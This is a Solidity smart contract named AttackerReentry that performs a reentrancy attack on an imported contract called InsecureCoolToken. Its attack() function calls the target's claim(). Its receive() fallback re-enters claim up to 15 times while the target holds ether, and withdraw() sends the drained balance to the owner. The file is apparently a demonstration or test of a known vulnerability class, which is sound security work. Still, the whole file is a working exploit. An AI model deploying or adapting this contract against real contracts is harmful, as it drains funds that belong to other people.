// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./InsecureCoolToken.sol";

contract AttackerReentry {

    InsecureCoolToken public target;
    address private owner;

    address private account;
    uint256 private votingRound;
    uint256 private price;

    uint256 public recursionCount = 0;
    uint256 public constant MAX_RECURSION = 15;
    constructor (address target_){
        target = InsecureCoolToken(target_);
        owner = msg.sender;
    }


    function attack(
        address account_,
        uint256 votingRound_,
        uint256 price_
    ) public {
        require(msg.sender == owner);

        account = account_;
        votingRound = votingRound_;
        price = price_;

        target.claim(account_, votingRound_, price_);
    }

    receive() external payable {
        if (recursionCount < MAX_RECURSION) {
            recursionCount++; 

            if (address(target).balance > 0) {
                target.claim(account, votingRound, price);
            }
        }
    }

    function withdraw() external {
        require(msg.sender == owner);
        
        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
        require(ok, "Withdrawal failed");
    }
}